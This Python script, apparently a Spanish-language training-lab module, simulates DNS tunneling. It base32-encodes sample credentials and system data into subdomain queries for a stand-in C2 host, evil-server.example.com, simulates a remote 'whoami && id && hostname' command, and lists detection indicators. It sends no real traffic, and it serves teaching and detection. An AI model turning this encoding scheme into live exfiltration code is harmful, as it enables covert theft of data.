#!/usr/bin/env python3
"""
Modulo 14: Simulacion de DNS Tunneling

Simula el tunelado de datos via consultas DNS:
- Codifica mensajes ocultos en subdominios DNS
- Demuestra como exfiltrar datos sin conexiones directas
- Muestra trafico DNS simulado con labels largos
- NO genera trafico DNS real ni se conecta a servidores
- Opera exclusivamente dentro de ./directorio_pruebas/

Uso:
    python dns_tunneling.py              Ejecutar simulacion
    python dns_tunneling.py --clean      Eliminar artefactos generados
    python dns_tunneling.py --help       Mostrar ayuda
    python dns_tunneling.py --mensaje X  Mensaje personalizado a tunelar
"""
import os
import sys
import base64
import time
import random
import hashlib
import argparse
import shutil
import json

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..'))

from core.common import log, safe_print, color, banner, traverse_lab_files
from core.common import hash_file, read_file, cleanup, write_log, is_lab_ready

MODULO_DIR = os.path.dirname(os.path.abspath(__file__))
ROOT_DIR = os.path.join(MODULO_DIR, '..', '..')

# Directorio de trabajo confinado
DIR_SIMULACION = os.path.join(os.getcwd(), 'directorio_pruebas')

# Configuracion del DNS tunnel simulado
DOMINIO_C2 = "evil-server.example.com"
MAX_LABEL_LEN = 63  # Limite real de un label DNS (RFC 1035)
CHUNK_SIZE = 20     # Caracteres por label (simulacion realista)
PUERTO_DNS = 53

# Mensajes de ejemplo para exfiltrar (simulan datos sensibles)
MENSAJES_EJEMPLO = [
    "credenciales:admin@empresa.com:P@ssw0rd123",
    "hostname:WORKPC01,usuario:maria.rodriguez",
    "secret_key=sk_live_4eC39HqLyjWDarjtT1zdp7dc",
    "GET /etc/passwd RESULT:root:x:0:0:root:/root:/bin/bash",
    "internal_ip:192.168.1.45,mac:AA:BB:CC:DD:EE:FF",
]


def preparar_directorio():
    """Crea directorio_pruebas/ y copia archivos de prueba del laboratorio."""
    os.makedirs(DIR_SIMULACION, exist_ok=True)
    safe_print(color("  Preparando directorio de trabajo...", 'cyan'))

    archivos_lab = [
        'documento.txt', 'notas.txt', 'script.py', 'index.html',
        'datos.csv', 'leeme.md', 'imagen.png', 'imagen.jpg',
        'audio.mp3', 'documento.docx', 'planilla.xlsx', 'presentacion.pptx',
    ]

    copiados = 0
    for nombre in archivos_lab:
        origen = os.path.join(ROOT_DIR, nombre)
        destino = os.path.join(DIR_SIMULACION, nombre)
        if os.path.exists(origen) and not os.path.exists(destino):
            shutil.copy2(origen, destino)
            copiados += 1

    safe_print(color(f"  Archivos copiados a directorio_pruebas/: {copiados}", 'green'))
    log(f"Directorio preparado: {copiados} archivos copiados")
    return copiados


def base32_encode(datos):
    """Codifica datos en base32 — formato DNS-safe (solo A-Z, 2-7)."""
    if isinstance(datos, str):
        datos = datos.encode('utf-8')
    encoded = base64.b32encode(datos).decode('ascii').rstrip('=')
    return encoded


def base32_decode(encoded):
    """Decodifica datos de base32, reinsertando padding necesario."""
    padding = (8 - len(encoded) % 8) % 8
    encoded += '=' * padding
    return base64.b32decode(encoded)


def dividir_en_chunks(datos, chunk_size):
    """Divide datos en chunks para enviar en labels DNS (max 63 chars)."""
    chunks = []
    for i in range(0, len(datos), chunk_size):
        chunks.append(datos[i:i + chunk_size])
    return chunks


def simular_consulta_dns(subdominio, dominio):
    """
    Simula una consulta DNS y retorna la respuesta.
    En un ataque real, esto enviaria un paquete UDP al puerto 53.
    """
    query_completa = f"{subdominio}.{dominio}"
    query_len = len(query_completa)

    # IP aleatoria simulada como respuesta
    respuesta_ip = f"{random.randint(1,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
    ttl = random.randint(30, 300)

    return {
        'query': query_completa,
        'query_len': query_len,
        'label_len': len(subdominio),
        'respuesta': respuesta_ip,
        'ttl': ttl,
        'tipo': 'A' if random.random() > 0.3 else 'TXT',
    }


def simular_exfiltracion(mensaje, dominio):
    """
    Simula la exfiltracion de un mensaje via DNS tunneling.

    Flujo:
    1. Codifica el mensaje en base32 (DNS-safe)
    2. Divide en chunks de CHUNK_SIZE caracteres
    3. Envia cada chunk como subdominio de una consulta DNS
    4. El servidor C2 recibe, decodifica y reconstruye el mensaje
    """
    safe_print(color("\n--- PASO 1: Codificacion del mensaje ---", 'cyan'))

    mensaje_bytes = mensaje.encode('utf-8')
    safe_print(f"  Mensaje original: {color(mensaje[:50] + ('...' if len(mensaje) > 50 else ''), 'yellow')}")
    safe_print(f"  Tamano: {color(f'{len(mensaje_bytes)} bytes', 'green')}")
    log(f"Mensaje a exfiltrar: {len(mensaje_bytes)} bytes")

    # Codificar en base32
    encoded = base32_encode(mensaje_bytes)
    safe_print(f"  Codificado (base32): {color(encoded[:40] + ('...' if len(encoded) > 40 else ''), 'green')}")
    safe_print(f"  Tamano codificado: {color(f'{len(encoded)} caracteres', 'green')}")
    log(f"Base32: {len(encoded)} caracteres")

    # Dividir en chunks
    chunks = dividir_en_chunks(encoded, CHUNK_SIZE)
    safe_print(f"  Chunks a enviar: {color(str(len(chunks)), 'green')} (max {CHUNK_SIZE} chars por label)")
    log(f"Chunks: {len(chunks)}")

    safe_print(color("\n--- PASO 2: Envio de consultas DNS ---", 'cyan'))
    safe_print(f"  Servidor DNS autoritativo: {color(dominio, 'red')}")
    safe_print(f"  Puerto: {color(str(PUERTO_DNS), 'green')}")
    safe_print(f"  Protocolo: {color('UDP', 'green')}")

    # Simular envio de cada chunk como consulta DNS
    resultados = []
    for i, chunk in enumerate(chunks):
        # Crear subdominio: [chunk].[prefijo]  (ej: aGVsbG8=.d00.evil.com)
        prefijo = f"d{i:02d}"
        subdominio = f"{chunk}.{prefijo}"

        # Simular consulta DNS
        resultado = simular_consulta_dns(subdominio, dominio)
        resultados.append(resultado)

        safe_print(
            f"  {color('>', 'yellow')} [{i+1}/{len(chunks)}] "
            f"DNS query: {color(resultado['query'][:50] + '...', 'cyan')} "
            f"({resultado['label_len']} chars, {resultado['tipo']})"
        )
        log(f"DNS query [{i+1}/{len(chunks)}]: {resultado['query'][:60]}...")

        # Barra de progreso
        progreso = (i + 1) / len(chunks)
        barra_len = 25
        lleno = int(barra_len * progreso)
        barra = '#' * lleno + '-' * (barra_len - lleno)
        safe_print(
            f"    [{color(barra, 'cyan')}] "
            f"{(i+1)*CHUNK_SIZE}/{len(encoded)} chars enviados"
        )

        time.sleep(0.2)

    # Paso 3: Respuesta del servidor C2
    safe_print(color("\n--- PASO 3: Respuesta del servidor C2 ---", 'cyan'))
    safe_print(f"  El servidor C2 {color(dominio, 'red')} recibe las consultas:")
    safe_print(f"    Extrae subdominios de cada query")
    safe_print(f"    Reconstruye el mensaje: {color(encoded, 'yellow')}")
    safe_print(f"    Decodifica base32: {color(mensaje[:50], 'green')}")
    log("Servidor C2 recibio y decodifico el mensaje")

    # Paso 4: Resumen
    safe_print(color("\n--- PASO 4: Resumen de la sesion ---", 'cyan'))
    safe_print(f"  Total de queries DNS: {color(str(len(resultados)), 'green')}")
    safe_print(f"  Bytes exfiltrados: {color(str(len(mensaje_bytes)), 'green')}")
    safe_print(f"  Caracteres en subdominios: {color(str(len(encoded)), 'green')}")
    safe_print(f"  Tiempo total: ~{color(f'{len(resultados) * 0.2:.1f}s', 'green')}")
    safe_print(f"  Dominio C2: {color(dominio, 'red')}")
    safe_print(f"  Protocolo: DNS/{color('UDP', 'green')}/{color('53', 'green')}")

    safe_print(color("\n  Nota: Todo el trafico DNS simulado permanece en este proceso.", 'yellow'))
    safe_print(color("  No se envian paquetes reales a servidores DNS.\n", 'yellow'))

    log(f"Sesion DNS tunnel completada: {len(chunks)} queries, {len(mensaje_bytes)} bytes")

    return resultados, encoded


def simular_c2_mensaje(dominio):
    """Simula un canal C2 bidireccional via DNS tunneling."""
    safe_print(color("\n--- SIMULACION C2: Comando remoto via DNS ---", 'cyan'))
    log("Simulando canal C2")

    # Comando del atacante
    comando = "whoami && id && hostname"
    safe_print(f"  Comando a ejecutar: {color(comando, 'red')}")

    # Codificar comando en base32
    cmd_encoded = base32_encode(comando.encode('utf-8'))
    safe_print(f"  Comando codificado: {color(cmd_encoded, 'yellow')}")

    # Enviar via DNS
    subdominio = f"{cmd_encoded}.c2"
    resultado = simular_consulta_dns(subdominio, dominio)
    safe_print(f"  Query: {color(resultado['query'][:60], 'cyan')}")

    # Respuesta simulada del sistema victima
    respuesta_cmd = "www-data\\nuid=33(www-data)\\nworkstation01"
    safe_print(f"\n  Respuesta del servidor DNS:")
    safe_print(f"    {color(respuesta_cmd, 'green')}")

    # Simular exfiltracion de la respuesta
    resp_encoded = base32_encode(respuesta_cmd.encode('utf-8'))
    safe_print(f"  Respuesta codificada: {color(resp_encoded[:30] + '...', 'yellow')}")

    log(f"Comando C2 simulado: {comando}")
    return respuesta_cmd


def simular_deteccion():
    """Muestra los indicadores que veria un analista de SOC."""
    safe_print(color("\n--- DETECCION: Que veria un analista ---", 'cyan'))

    indicadores = [
        ("Subdominios inusualmente largos", "Labels > 30 caracteres (normales: 5-15)"),
        ("Frecuencia alta de queries", "Cientos de consultas al mismo dominio"),
        ("Base32/Base64 en subdominios", "Patron de codificacion visible"),
        ("TTL bajo", "TTL de 30-60s indica registro dinamico"),
        ("Dominio nuevo recien registrado", "Dominio creado hace dias/semanas"),
        ("Mismo dominio, subdominios variados", "Patron de exfiltracion tipico"),
    ]

    safe_print(f"  {'Indicador':<45} {'Descripcion'}")
    safe_print(f"  {'-'*45} {'-'*45}")
    for indicador, desc in indicadores:
        safe_print(f"  {color('*', 'red')} {indicador:<43} {desc}")

    safe_print(color("\n  Herramientas de deteccion:", 'yellow'))
    safe_print("  - Suricata: reglas DNS tunneling")
    safe_print("  - Zeek/Bro: analisis de trafico DNS")
    safe_print("  - Passive DNS: historial de consultas")
    safe_print("  - DNS analytics: Machine Learning sobre patrones")


def simular_dns_tunneling(mensaje=None, dominio=DOMINIO_C2):
    """Ejecuta la simulacion completa de DNS tunneling."""
    banner("DNS TUNNELING -- SIMULACION EDUCATIVA",
           "Exfiltracion de datos via consultas DNS")

    safe_print(color("[EDUCATIVO] Este programa NO genera trafico DNS real.", 'yellow'))
    safe_print(color("[EDUCATIVO] NO se conecta a servidores externos.\n", 'yellow'))

    # Preparar directorio
    preparar_directorio()

    # Seleccionar mensaje
    if mensaje is None:
        mensaje = random.choice(MENSAJES_EJEMPLO)

    safe_print(color("\n--- Configuracion ---", 'cyan'))
    safe_print(f"  Dominio C2:      {color(dominio, 'red')}")
    safe_print(f"  Puerto DNS:      {color(str(PUERTO_DNS), 'green')}")
    safe_print(f"  Max label len:   {color(str(MAX_LABEL_LEN), 'green')}")
    safe_print(f"  Chunk size:      {color(str(CHUNK_SIZE), 'green')} chars")
    safe_print(f"  Directorio:      {color(DIR_SIMULACION, 'green')}")

    # Fase 1-4: Exfiltracion
    resultados, encoded = simular_exfiltracion(mensaje, dominio)

    # Fase 5: Canal C2
    simular_c2_mensaje(dominio)

    # Fase 6: Deteccion
    simular_deteccion()

    # Fase 7: Generar artefactos en directorio_pruebas/
    safe_print(color("\n--- FASE 7: Generando artefactos ---", 'cyan'))
    _generar_log_dns(resultados, mensaje, encoded)
    _generar_script_tunnel()

    safe_print(color("\n  Los artefactos estan en: directorio_pruebas/", 'green'))
    safe_print(color("  Ejecuta con --clean para eliminarlos.\n", 'green'))


def _generar_log_dns(resultados, mensaje_original, encoded):
    """Genera un log de trafico DNS simulado dentro de directorio_pruebas/."""
    log_path = os.path.join(DIR_SIMULACION, 'dns_traffic.log')
    with open(log_path, 'w') as f:
        f.write("=== DNS TRAFFIC LOG (simulado) ===\n")
        f.write(f"Mensaje exfiltrado: {mensaje_original[:50]}\n")
        f.write(f"Base32: {encoded}\n")
        f.write(f"Total queries: {len(resultados)}\n\n")

        for i, r in enumerate(resultados, 1):
            f.write(f"[{i:03d}] {r['query']:<60} "
                    f"Tipo: {r['tipo']:<4} "
                    f"Respuesta: {r['respuesta']} "
                    f"TTL: {r['ttl']}\n")

    safe_print(f"  {color('>', 'yellow')} Log de trafico DNS: {log_path}")
    log(f"Log DNS generado: {log_path}")


def _generar_script_tunnel():
    """Genera un script Python que simula el payload de DNS tunneling."""
    script_path = os.path.join(DIR_SIMULACION, 'dns_payload.py')
    contenido = '''#!/usr/bin/env python3
"""
Payload simulado de DNS tunneling (EDUCATIVO).
Este script NO genera trafico DNS real.
"""
import base64

DOMINIO_C2 = "evil-server.example.com"

def codificar_dns(datos):
    """Codifica datos para envio via DNS (base32)."""
    if isinstance(datos, str):
        datos = datos.encode('utf-8')
    return base64.b32encode(datos).decode('ascii').rstrip('=')

def decodificar_dns(encoded):
    """Decodifica datos recibidos via DNS (base32)."""
    padding = (8 - len(encoded) % 8) % 8
    encoded += '=' * padding
    return base64.b32decode(encoded).decode('utf-8', errors='replace')

def simular_query(dato):
    """Genera una consulta DNS simulada."""
    encoded = codificar_dns(dato)
    query = f"{encoded}.{DOMINIO_C2}"
    print(f"  DNS query: {query}")
    return query

if __name__ == "__main__":
    print("=== DNS Tunnel Payload (SIMULADO) ===")
    mensaje = "credenciales:admin@empresa.com:password123"
    print(f"Mensaje original: {mensaje}")
    print(f"Codificado: {codificar_dns(mensaje)}")
    chunks = [mensaje[i:i+20] for i in range(0, len(mensaje), 20)]
    for i, chunk in enumerate(chunks):
        simular_query(chunk)
    print("\\n[SIMULADO] Fin de la transmision")
'''
    with open(script_path, 'w') as f:
        f.write(contenido)
    safe_print(f"  {color('>', 'yellow')} Script payload: {script_path}")
    log(f"Script payload generado: {script_path}")


def limpiar():
    """Elimina directorio_pruebas/ y todo su contenido."""
    banner("DNS TUNNELING -- LIMPIEZA", "Eliminando directorio de prueba")

    if os.path.isdir(DIR_SIMULACION):
        try:
            shutil.rmtree(DIR_SIMULACION)
            safe_print(color(f"  [OK] Eliminado: {DIR_SIMULACION}/ (entero)", 'green'))
            log(f"Directorio eliminado: {DIR_SIMULACION}")
        except Exception as e:
            safe_print(color(f"  [ERROR] {e}", 'red'))
    else:
        safe_print(color("  directorio_pruebas/ no existe, nada que limpiar.", 'yellow'))


def mostrar_ayuda():
    """Muestra informacion de ayuda."""
    banner("DNS TUNNELING -- AYUDA", "Simulacion de exfiltracion via DNS")

    safe_print("""
  Uso:
    python dns_tunneling.py [OPCIONES]

  Opciones:
    --clean         Elimina directorio_pruebas/ y todos los artefactos
    --mensaje TEXTO Mensaje personalizado a exfiltrar
    --help          Muestra esta ayuda

  Descripcion:
    Simula DNS tunneling -- la exfiltracion de datos via consultas DNS.
    Codifica mensajes en subdominios y simula el trafico DNS completo.
    NO genera trafico DNS real ni se conecta a servidores externos.
    Opera exclusivamente dentro de directorio_pruebas/.

  Artefactos generados (en directorio_pruebas/):
    - dns_traffic.log    Log del trafico DNS simulado
    - dns_payload.py     Script payload de tunneling

  Mensajes de ejemplo:
    - Credenciales: admin@empresa.com:P@ssw0rd123
    - Informacion del sistema: hostname, usuario, IP
    - Datos sensibles: claves API, tokens
    - Comandos C2: whoami, id, hostname

  Tecnicas demostradas:
    - Base32 encoding en subdominios
    - Chunking de datos para labels DNS
    - Canal C2 bidireccional
    - Indicadores de deteccion
""")


def main():
    parser = argparse.ArgumentParser(
        description='Simulacion de DNS tunneling',
        add_help=False
    )
    parser.add_argument('--clean', action='store_true',
                        help='Eliminar directorio_pruebas/ y artefactos')
    parser.add_argument('--help', action='store_true',
                        help='Mostrar ayuda')
    parser.add_argument('--mensaje', type=str, default=None,
                        help='Mensaje personalizado a exfiltrar')

    args = parser.parse_args()

    if args.help:
        mostrar_ayuda()
        return

    if args.clean:
        limpiar()
        return

    simular_dns_tunneling(mensaje=args.mensaje)


if __name__ == "__main__":
    main()
